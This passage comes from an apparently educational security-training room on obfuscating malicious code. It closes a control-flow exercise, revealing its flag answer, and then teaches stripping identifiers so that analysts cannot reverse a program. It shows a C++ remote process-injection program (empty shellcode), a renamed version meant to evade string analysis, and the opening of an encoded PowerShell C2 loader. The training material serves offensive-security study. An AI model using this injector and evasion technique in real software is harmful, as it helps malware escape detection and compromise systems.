case_3 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"1b"</span><span class="token punctuation">,</span><span class="token string">"2b"</span><span class="token punctuation">,</span><span class="token string">"M"</span><span class="token punctuation">,</span><span class="token string">"4b"</span><span class="token punctuation">,</span><span class="token string">"5b"</span><span class="token punctuation">,</span><span class="token string">"6b"</span><span class="token punctuation">,</span><span class="token string">"c"</span><span class="token punctuation">,</span><span class="token string">"8b"</span><span class="token punctuation">,</span><span class="token string">"9b"</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">,</span><span class="token string">"11b"</span><span class="token punctuation">,</span><span class="token string">"12b"</span><span class="token punctuation">,</span><span class="token string">"13b"</span><span class="token punctuation">,</span><span class="token string">"14b"</span><span class="token punctuation">]</span>
case_4 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"1c"</span><span class="token punctuation">,</span><span class="token string">"2c"</span><span class="token punctuation">,</span><span class="token string">"3c"</span><span class="token punctuation">,</span><span class="token string">"{"</span><span class="token punctuation">,</span><span class="token string">"5c"</span><span class="token punctuation">,</span><span class="token string">"6c"</span><span class="token punctuation">,</span><span class="token string">"7c"</span><span class="token punctuation">,</span><span class="token string">"8c"</span><span class="token punctuation">,</span><span class="token string">"9c"</span><span class="token punctuation">,</span><span class="token string">"10c"</span><span class="token punctuation">,</span><span class="token string">"d"</span><span class="token punctuation">,</span><span class="token string">"12c"</span><span class="token punctuation">,</span><span class="token string">"13c"</span><span class="token punctuation">,</span><span class="token string">"14c"</span><span class="token punctuation">]</span>
case_5 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"1d"</span><span class="token punctuation">,</span><span class="token string">"2d"</span><span class="token punctuation">,</span><span class="token string">"3d"</span><span class="token punctuation">,</span><span class="token string">"4d"</span><span class="token punctuation">,</span><span class="token string">"D"</span><span class="token punctuation">,</span><span class="token string">"6d"</span><span class="token punctuation">,</span><span class="token string">"7d"</span><span class="token punctuation">,</span><span class="token string">"o"</span><span class="token punctuation">,</span><span class="token string">"9d"</span><span class="token punctuation">,</span><span class="token string">"10d"</span><span class="token punctuation">,</span><span class="token string">"11d"</span><span class="token punctuation">,</span><span class="token string">"!"</span><span class="token punctuation">,</span><span class="token string">"13d"</span><span class="token punctuation">,</span><span class="token string">"14d"</span><span class="token punctuation">]</span>
case_6 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"1e"</span><span class="token punctuation">,</span><span class="token string">"2e"</span><span class="token punctuation">,</span><span class="token string">"3e"</span><span class="token punctuation">,</span><span class="token string">"4e"</span><span class="token punctuation">,</span><span class="token string">"5e"</span><span class="token punctuation">,</span><span class="token string">"6e"</span><span class="token punctuation">,</span><span class="token string">"7e"</span><span class="token punctuation">,</span><span class="token string">"8e"</span><span class="token punctuation">,</span><span class="token string">"9e"</span><span class="token punctuation">,</span><span class="token string">"10e"</span><span class="token punctuation">,</span><span class="token string">"11e"</span><span class="token punctuation">,</span><span class="token string">"12e"</span><span class="token punctuation">,</span><span class="token string">"13e"</span><span class="token punctuation">,</span><span class="token string">"}"</span><span class="token punctuation">]</span>

<span class="token keyword">while</span> <span class="token punctuation">(</span>x <span class="token operator">&gt;</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        x <span class="token operator">=</span> x <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">+</span> <span class="token number">1</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        x <span class="token operator">=</span> x <span class="token operator">/</span> <span class="token number">2</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> y <span class="token keyword">in</span> case_1<span class="token punctuation">:</span>
            match swVar<span class="token punctuation">:</span>
                case <span class="token number">1</span><span class="token punctuation">:</span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span>case_1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
                    a <span class="token operator">=</span> <span class="token number">2</span>
                    b <span class="token operator">=</span> <span class="token number">214025</span>
                    swVar <span class="token operator">=</span> <span class="token number">2</span>
                case <span class="token number">2</span><span class="token punctuation">:</span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span>case_2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">&gt;</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                        swVar <span class="token operator">=</span> <span class="token number">6</span>
                    <span class="token keyword">else</span><span class="token punctuation">:</span>
                        swVar <span class="token operator">=</span> <span class="token number">3</span>
                case <span class="token number">3</span><span class="token punctuation">:</span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span>case_3<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
                    b <span class="token operator">=</span> b <span class="token operator">+</span> a
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>b <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                        swVar <span class="token operator">=</span> <span class="token number">5</span>
                    <span class="token keyword">else</span><span class="token punctuation">:</span>
                        swVar <span class="token operator">=</span> <span class="token number">4</span>
                case <span class="token number">4</span><span class="token punctuation">:</span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span>case_4<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
                    b <span class="token operator">-=</span> b
                    swVar <span class="token operator">=</span> <span class="token number">5</span>
                case <span class="token number">5</span><span class="token punctuation">:</span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span>case_5<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
                    a <span class="token operator">+=</span> a
                    swVar <span class="token operator">=</span> <span class="token number">2</span>
                case <span class="token number">6</span><span class="token punctuation">:</span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span>case_5<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span>case_6<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
                    <span class="token keyword">break</span>
            i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span> </code></pre></details></div></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                What flag is found after properly reversing the provided snippet?
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***{**********}" value="THM{D3cod3d!!!}" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="7">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-8">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse8">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 8                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Protecting and Stripping Identifiable Information
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"><i class="far fa-server text-lgreen" data-toggle="tooltip" data-placement="left" title="" data-original-title="Task includes a deployable machine"></i></span>
                        </a>
                    </div>
                    <div id="collapse8" class="collapse " data-parent="#taskContent">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"><div class="btn-group mb-3 ml-3 float-right">
            <button type="button" class="btn btn-success" value="62e82ec49e04f50049f0d07a" onclick="deploy(this)"><i class="fas fa-play mr-2"></i> Start Machine</button>
        </div> <p><span>﻿</span>Identifiable information can be one of the most critical components an analyst can use to dissect and attempt to understand a malicious program. By limiting the amount of identifiable information (variables, function names, etc.), an analyst has, the better chance an attacker has they won't be able to reconstruct its original function.</p><p>At a high level, we should consider three different types of identifiable data: code structure, object names, and file/compilation properties. In this task, we will break down the core concepts of each and a case study of a practical approach to each.</p><hr><h3><span style="font-size:24px">Object Names</span></h3><p>Object names offer some of the most significant insight into a program's functionality and can reveal the exact purpose of a function. An analyst can still deconstruct the purpose of a function from its behavior, but this is much harder if there is no context to the function.</p><p>The importance of literal object names may change depending on if the language is&nbsp;<strong>compiled</strong>
&nbsp;or&nbsp;<strong>interpreted</strong>. If an interpreted language such as&nbsp;<strong>Python</strong> or&nbsp;<strong><span><a class="MTZtHdvr glossary-term" onclick="initPopOver(&#39;PowerShell&#39;, &#39;MTZtHdvr&#39;)">PowerShell</a></span></strong>&nbsp;is used, then all objects matter and must be modified. If a compiled language such as&nbsp;<strong>C</strong>&nbsp;or&nbsp;<strong>C#</strong> is used, only objects appearing in the strings are generally significant. An object may appear in the strings by any function that produces an&nbsp;<strong>IO operation</strong>.</p><p>The aforementioned white paper: <a href="https://cybersecurity.springeropen.com/articles/10.1186/s42400-020-00049-3">Layered Obfuscation Taxonomy</a>, summarizes these practices well under the <strong>code-element</strong> layer’s <strong>meaningless identifiers</strong> method.</p><p>Below we will observe two basic examples of replacing meaningful identifiers for both an interpreted and compiled language.</p><hr><p>As an example of a compiled language, we can observe a process injector written in C++ that reports its status to the command line.</p><pre class=" language-c" tabindex="0"><code class=" language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"windows.h"</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string&gt;</span></span>
using namespace std<span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">char</span> shellcode<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>

	HANDLE processHandle<span class="token punctuation">;</span>
	HANDLE remoteThread<span class="token punctuation">;</span>
	PVOID remoteBuffer<span class="token punctuation">;</span>
	string leaked <span class="token operator">=</span> <span class="token string">"This was leaked in the strings"</span><span class="token punctuation">;</span>

	processHandle <span class="token operator">=</span> <span class="token function">OpenProcess</span><span class="token punctuation">(</span>PROCESS_ALL_ACCESS<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> <span class="token function">DWORD</span><span class="token punctuation">(</span><span class="token function">atoi</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Handle obtained for"</span> <span class="token operator">&lt;&lt;</span> processHandle<span class="token punctuation">;</span>
	remoteBuffer <span class="token operator">=</span> <span class="token function">VirtualAllocEx</span><span class="token punctuation">(</span>processHandle<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span> shellcode<span class="token punctuation">,</span> <span class="token punctuation">(</span>MEM_RESERVE <span class="token operator">|</span> MEM_COMMIT<span class="token punctuation">)</span><span class="token punctuation">,</span> PAGE_EXECUTE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">;</span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Buffer Created"</span><span class="token punctuation">;</span>
	<span class="token function">WriteProcessMemory</span><span class="token punctuation">(</span>processHandle<span class="token punctuation">,</span> remoteBuffer<span class="token punctuation">,</span> shellcode<span class="token punctuation">,</span> <span class="token keyword">sizeof</span> shellcode<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Process written with buffer"</span> <span class="token operator">&lt;&lt;</span> remoteBuffer<span class="token punctuation">;</span>
	remoteThread <span class="token operator">=</span> <span class="token function">CreateRemoteThread</span><span class="token punctuation">(</span>processHandle<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>LPTHREAD_START_ROUTINE<span class="token punctuation">)</span>remoteBuffer<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">CloseHandle</span><span class="token punctuation">(</span>processHandle<span class="token punctuation">)</span><span class="token punctuation">;</span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Closing handle"</span> <span class="token operator">&lt;&lt;</span> processHandle<span class="token punctuation">;</span>
	cout <span class="token operator">&lt;&lt;</span> leaked<span class="token punctuation">;</span>

	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><p>Let’s use strings to see exactly what was leaked when this source code is compiled.</p><pre class=" language-powershell" tabindex="0"><code class=" language-powershell">C:\&gt;<span class="token punctuation">.</span>\strings<span class="token punctuation">.</span>exe <span class="token string">"\Injector.exe"</span>

Strings v2<span class="token punctuation">.</span>54 <span class="token operator">-</span> Search <span class="token keyword">for</span> ANSI and Unicode strings in binary images<span class="token punctuation">.</span>
Copyright <span class="token punctuation">(</span>C<span class="token punctuation">)</span> 1999<span class="token operator">-</span>2021 Mark Russinovich
Sysinternals <span class="token operator">-</span> www<span class="token punctuation">.</span>sysinternals<span class="token punctuation">.</span>com

<span class="token operator">!</span>This program cannot be run in DOS mode<span class="token punctuation">.</span>
&gt;FU
z<span class="token string">';
z'</span><span class="token punctuation">;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token namespace">[snip]</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
Y_^<span class="token punctuation">[</span>
leaked
shellcode
2_^<span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token namespace">[snip]</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
std::_Adjust_manually_vector_aligned
<span class="token string">"invalid argument"</span>
string too long
This was leaked in the strings
Handle obtained <span class="token keyword">for</span>
Buffer Created
<span class="token keyword">Process</span> written with buffer
Closing handle
std::_Allocate_manually_vector_aligned
bad allocation
Stack around the variable '
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token namespace">[snip]</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
8@9H9T9X9\\9h9<span class="token punctuation">|</span>9
:$:<span class="token punctuation">(</span>:D:H:
@1p1
</code></pre><p>Notice that all of the iostream was written to strings, and even the shellcode byte array was leaked. This is a smaller program, so imagine what a fleshed-out and un-obfuscated program would look like!</p><p>We can remove comments and replace the meaningful identifiers to resolve this problem.</p><pre class=" language-c" tabindex="0"><code class=" language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"windows.h"</span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">char</span> awoler<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>

	HANDLE awerfu<span class="token punctuation">;</span>
	HANDLE rwfhbf<span class="token punctuation">;</span>
	PVOID iauwef<span class="token punctuation">;</span>

	awerfu <span class="token operator">=</span> <span class="token function">OpenProcess</span><span class="token punctuation">(</span>PROCESS_ALL_ACCESS<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> <span class="token function">DWORD</span><span class="token punctuation">(</span><span class="token function">atoi</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	iauwef <span class="token operator">=</span> <span class="token function">VirtualAllocEx</span><span class="token punctuation">(</span>awerfu<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span> awoler<span class="token punctuation">,</span> <span class="token punctuation">(</span>MEM_RESERVE <span class="token operator">|</span> MEM_COMMIT<span class="token punctuation">)</span><span class="token punctuation">,</span> PAGE_EXECUTE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">WriteProcessMemory</span><span class="token punctuation">(</span>awerfu<span class="token punctuation">,</span> iauwef<span class="token punctuation">,</span> awoler<span class="token punctuation">,</span> <span class="token keyword">sizeof</span> awoler<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	rwfhbf <span class="token operator">=</span> <span class="token function">CreateRemoteThread</span><span class="token punctuation">(</span>awerfu<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>LPTHREAD_START_ROUTINE<span class="token punctuation">)</span>iauwef<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">CloseHandle</span><span class="token punctuation">(</span>awerfu<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><p>We should no longer have any identifiable string information, and the program is safe from string analysis.</p><hr><p>As an example for an interpreted language we can observe the deprecated <a href="https://github.com/paranoidninja/Brute-Ratel-C4-Community-Kit/blob/main/deprecated/badger_template.ps1">Badger PowerShell loader</a> from the <a href="https://github.com/paranoidninja/Brute-Ratel-C4-Community-Kit">BRC4 Community Kit</a>.</p><pre class=" language-powershell" tabindex="0"><code class=" language-powershell"><span class="token function">Set-StrictMode</span> <span class="token operator">-</span>Version 2
<span class="token namespace">[Byte[]]</span> <span class="token variable">$Ait1m</span> = @<span class="token punctuation">(</span>0x3d<span class="token punctuation">,</span> 0x50<span class="token punctuation">,</span> 0x51<span class="token punctuation">,</span> 0x57<span class="token punctuation">,</span> 0x50<span class="token punctuation">,</span> 0x4e<span class="token punctuation">,</span> 0x5f<span class="token punctuation">,</span> 0x50<span class="token punctuation">,</span> 0x4f<span class="token punctuation">,</span> 0x2f<span class="token punctuation">,</span> 0x50<span class="token punctuation">,</span> 0x57<span class="token punctuation">,</span> 0x50<span class="token punctuation">,</span> 0x52<span class="token punctuation">,</span> 0x4c<span class="token punctuation">,</span> 0x5f<span class="token punctuation">,</span> 0x50<span class="token punctuation">)</span>
<span class="token namespace">[Byte[]]</span> <span class="token variable">$ahv3I</span> = @<span class="token punctuation">(</span>0x34<span class="token punctuation">,</span> 0x59<span class="token punctuation">,</span> 0x38<span class="token punctuation">,</span> 0x50<span class="token punctuation">,</span> 0x58<span class="token punctuation">,</span> 0x5a<span class="token punctuation">,</span> 0x5d<span class="token punctuation">,</span> 0x64<span class="token punctuation">,</span> 0x38<span class="token punctuation">,</span> 0x5a<span class="token punctuation">,</span> 0x4f<span class="token punctuation">,</span> 0x60<span class="token punctuation">,</span> 0x57<span class="token punctuation">,</span> 0x50<span class="token punctuation">)</span>
<span class="token namespace">[Byte[]]</span> <span class="token variable">$Moo5y</span> = @<span class="token punctuation">(</span>0x38<span class="token punctuation">,</span> 0x64<span class="token punctuation">,</span> 0x2f<span class="token punctuation">,</span> 0x50<span class="token punctuation">,</span> 0x57<span class="token punctuation">,</span> 0x50<span class="token punctuation">,</span> 0x52<span class="token punctuation">,</span> 0x4c<span class="token punctuation">,</span> 0x5f<span class="token punctuation">,</span> 0x50<span class="token punctuation">,</span> 0x3f<span class="token punctuation">,</span> 0x64<span class="token punctuation">,</span> 0x5b<span class="token punctuation">,</span> 0x50<span class="token punctuation">)</span>
<span class="token namespace">[Byte[]]</span> <span class="token variable">$ooR5o</span> = @<span class="token punctuation">(</span>0x2e<span class="token punctuation">,</span> 0x57<span class="token punctuation">,</span> 0x4c<span class="token punctuation">,</span> 0x5e<span class="token punctuation">,</span> 0x5e<span class="token punctuation">,</span> 0x17<span class="token punctuation">,</span> 0x0b<span class="token punctuation">,</span> 0x3b<span class="token punctuation">,</span> 0x60<span class="token punctuation">,</span> 0x4d<span class="token punctuation">,</span> 0x57<span class="token punctuation">,</span> 0x54<span class="token punctuation">,</span> 0x4e<span class="token punctuation">,</span> 0x17<span class="token punctuation">,</span> 0x0b<span class="token punctuation">,</span> 0x3e<span class="token punctuation">,</span> 0x50<span class="token punctuation">,</span> 0x4c<span class="token punctuation">,</span> 0x57<span class="token punctuation">,</span> 0x50<span class="token punctuation">,</span> 0x4f<span class="token punctuation">,</span> 0x17<span class="token punctuation">,</span> 0x0b<span class="token punctuation">,</span> 0x2c<span class="token punctuation">,</span> 0x59<span class="token punctuation">,</span> 0x5e<span class="token punctuation">,</span> 0x54<span class="token punctuation">,</span> 0x2e<span class="token punctuation">,</span> 0x57<span class="token punctuation">,</span> 0x4c<span class="token punctuation">,</span> 0x5e<span class="token punctuation">,</span> 0x5e<span class="token punctuation">,</span> 0x17<span class="token punctuation">,</span> 0x0b<span class="token punctuation">,</span> 0x2c<span class="token punctuation">,</span> 0x60<span class="token punctuation">,</span> 0x5f<span class="token punctuation">,</span> 0x5a<span class="token punctuation">,</span> 0x2e<span class="token punctuation">,</span> 0x57<span class="token punctuation">,</span> 0x4c<span class="token punctuation">,</span> 0x5e<span class="token punctuation">,</span> 0x5e<span class="token punctuation">)</span>
<span class="token namespace">[Byte[]]</span> <span class="token variable">$Reo5o</span> = @<span class="token punctuation">(</span>0x3d<span class="token punctuation">,</span> 0x60<span class="token punctuation">,</span> 0x59<span class="token punctuation">,</span> 0x5f<span class="token punctuation">,</span> 0x54<span class="token punctuation">,</span> 0x58<span class="token punctuation">,</span> 0x50<span class="token punctuation">,</span> 0x17<span class="token punctuation">,</span> 0x0b<span class="token punctuation">,</span> 0x38<span class="token punctuation">,</span> 0x4c<span class="token punctuation">,</span> 0x59<span class="token punctuation">,</span> 0x4c<span class="token punctuation">,</span> 0x52<span class="token punctuation">,</span> 0x50<span class="token punctuation">,</span> 0x4f<span class="token punctuation">)</span>
<span class="token namespace">[Byte[]]</span> <span class="token variable">$Reib3</span> = @<span class="token punctuation">(</span>0x3d<span class="token punctuation">,</span> 0x3f<span class="token punctuation">,</span> 0x3e<span class="token punctuation">,</span> 0x5b<span class="token punctuation">,</span> 0x50<span class="token punctuation">,</span> 0x4e<span class="token punctuation">,</span> 0x54<span class="token punctuation">,</span> 0x4c<span class="token punctuation">,</span> 0x57<span class="token punctuation">,</span> 0x39<span class="token punctuation">,</span> 0x4c<span class="token punctuation">,</span> 0x58<span class="token punctuation">,</span> 0x50<span class="token punctuation">,</span> 0x17<span class="token punctuation">,</span> 0x0b<span class="token punctuation">,</span> 0x33<span class="token punctuation">,</span> 0x54<span class="token punctuation">,</span> 0x4f<span class="token punctuation">,</span> 0x50<span class="token punctuation">,</span> 0x2d<span class="token punctuation">,</span> 0x64<span class="token punctuation">,</span> 0x3e<span class="token punctuation">,</span> 0x54<span class="token punctuation">,</span> 0x52<span class="token punctuation">,</span> 0x17<span class="token punctuation">,</span> 0x0b<span class="token punctuation">,</span> 0x3b<span class="token punctuation">,</span> 0x60<span class="token punctuation">,</span> 0x4d<span class="token punctuation">,</span> 0x57<span class="token punctuation">,</span> 0x54<span class="token punctuation">,</span> 0x4e<span class="token punctuation">)</span>
<span class="token namespace">[Byte[]]</span> <span class="token variable">$Thah8</span> = @<span class="token punctuation">(</span>0x3b<span class="token punctuation">,</span> 0x60<span class="token punctuation">,</span> 0x4d<span class="token punctuation">,</span> 0x57<span class="token punctuation">,</span> 0x54<span class="token punctuation">,</span> 0x4e<span class="token punctuation">,</span> 0x17<span class="token punctuation">,</span> 0x0b<span class="token punctuation">,</span> 0x33<span class="token punctuation">,</span> 0x54<span class="token punctuation">,</span> 0x4f<span class="token punctuation">,</span> 0x50<span class="token punctuation">,</span> 0x2d<span class="token punctuation">,</span> 0x64<span class="token punctuation">,</span> 0x3e<span class="token punctuation">,</span> 0x54<span class="token punctuation">,</span> 0x52<span class="token punctuation">,</span> 0x17<span class="token punctuation">,</span> 0x0b<span class="token punctuation">,</span> 0x39<span class="token punctuation">,</span> 0x50<span class="token punctuation">,</span> 0x62<span class="token punctuation">,</span> 0x3e<span class="token punctuation">,</span> 0x57<span class="token punctuation">,</span> 0x5a<span class="token punctuation">,</span> 0x5f<span class="token punctuation">,</span> 0x17<span class="token punctuation">,</span> 0x0b<span class="token punctuation">,</span> 0x41<span class="token punctuation">,</span> 0x54<span class="token punctuation">,</span> 0x5d<span class="token punctuation">,</span> 0x5f<span class="token punctuation">,</span> 0x60<span class="token punctuation">,</span> 0x4c<span class="token punctuation">,</span> 0x57<span class="token punctuation">)</span>
<span class="token namespace">[Byte[]]</span> <span class="token variable">$ii5Ie</span> = @<span class="token punctuation">(</span>0x34<span class="token punctuation">,</span> 0x59<span class="token punctuation">,</span> 0x61<span class="token punctuation">,</span> 0x5a<span class="token punctuation">,</span> 0x56<span class="token punctuation">,</span> 0x50<span class="token punctuation">)</span>
<span class="token namespace">[Byte[]]</span> <span class="token variable">$KooG5</span> = @<span class="token punctuation">(</span>0x38<span class="token punctuation">,</span> 0x54<span class="token punctuation">,</span> 0x4e<span class="token punctuation">,</span> 0x5d<span class="token punctuation">,</span> 0x5a<span class="token punctuation">,</span> 0x5e<span class="token punctuation">,</span> 0x5a<span class="token punctuation">,</span> 0x51<span class="token punctuation">,</span> 0x5f<span class="token punctuation">,</span> 0x19<span class="token punctuation">,</span> 0x42<span class="token punctuation">,</span> 0x54<span class="token punctuation">,</span> 0x59<span class="token punctuation">,</span> 0x1e<span class="token punctuation">,</span> 0x1d<span class="token punctuation">,</span> 0x19<span class="token punctuation">,</span> 0x40<span class="token punctuation">,</span> 0x59<span class="token punctuation">,</span> 0x5e<span class="token punctuation">,</span> 0x4c<span class="token punctuation">,</span> 0x51<span class="token punctuation">,</span> 0x50<span class="token punctuation">,</span> 0x39<span class="token punctuation">,</span> 0x4c<span class="token punctuation">,</span> 0x5f<span class="token punctuation">,</span> 0x54<span class="token punctuation">,</span> 0x61<span class="token punctuation">,</span> 0x50<span class="token punctuation">,</span> 0x38<span class="token punctuation">,</span> 0x50<span class="token punctuation">,</span> 0x5f<span class="token punctuation">,</span> 0x53<span class="token punctuation">,</span> 0x5a<span class="token punctuation">,</span> 0x4f<span class="token punctuation">,</span> 0x5e<span class="token punctuation">)</span>
<span class="token namespace">[Byte[]]</span> <span class="token variable">$io9iH</span> = @<span class="token punctuation">(</span>0x32<span class="token punctuation">,</span> 0x50<span class="token punctuation">,</span> 0x5f<span class="token punctuation">,</span> 0x3b<span class="token punctuation">,</span> 0x5d<span class="token punctuation">,</span> 0x5a<span class="token punctuation">,</span> 0x4e<span class="token punctuation">,</span> 0x2c<span class="token punctuation">,</span> 0x4f<span class="token punctuation">,</span> 0x4f<span class="token punctuation">,</span> 0x5d<span class="token punctuation">,</span> 0x50<span class="token punctuation">,</span> 0x5e<span class="token punctuation">,</span> 0x5e<span class="token punctuation">)</span>
<span class="token namespace">[Byte[]]</span> <span class="token variable">$Qui5i</span> = @<span class="token punctuation">(</span>0x32<span class="token punctuation">,</span> 0x50<span class="token punctuation">,</span> 0x5f<span class="token punctuation">,</span> 0x38<span class="token punctuation">,</span> 0x5a<span class="token punctuation">,</span> 0x4f<span class="token punctuation">,</span> 0x60<span class="token punctuation">,</span> 0x57<span class="token punctuation">,</span> 0x50<span class="token punctuation">,</span> 0x33<span class="token punctuation">,</span> 0x4c<span class="token punctuation">,</span> 0x59<span class="token punctuation">,</span> 0x4f<span class="token punctuation">,</span> 0x57<span class="token punctuation">,</span> 0x50<span class="token punctuation">)</span>
<span class="token namespace">[Byte[]]</span> <span class="token variable">$xee2N</span> = @<span class="token punctuation">(</span>0x56<span class="token punctuation">,</span> 0x50<span class="token punctuation">,</span> 0x5d<span class="token punctuation">,</span> 0x59<span class="token punctuation">,</span> 0x50<span class="token punctuation">,</span> 0x57<span class="token punctuation">,</span> 0x1e<span class="token punctuation">,</span> 0x1d<span class="token punctuation">)</span>
